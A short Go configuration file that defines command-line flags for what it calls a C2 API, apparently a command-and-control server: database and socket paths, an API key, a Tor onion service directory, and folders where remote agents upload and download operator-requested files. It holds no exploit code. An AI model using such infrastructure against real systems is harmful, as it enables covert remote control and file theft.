package config

import "flag"

var (
	DbPath                 = flag.String("db-path", "api.db", "path to database")
	ApiSockPath            = flag.String("sock-path", "api.sock", "path to a unix socket of the c2 api")
	ApiHost                = flag.String("api-host", "127.0.0.1:8080", "<host>:<port> of the user facing api")
	ApiSecretKey           = flag.String("api-key", "", "secret key for user facing api")
	OnionServicePath       = flag.String("onion-service-path", "./onionservice", "path to onion service's directory")
	UploadsDirectoryPath   = flag.String("uploads-dir-path", "./agent-upload-dir", "path to directory where agents would upload files an operator requests of them")
	DownloadsDirectoryPath = flag.String("downloads-dir-path", "./agent-download-dir", "path to directory where agents would download files from")
)
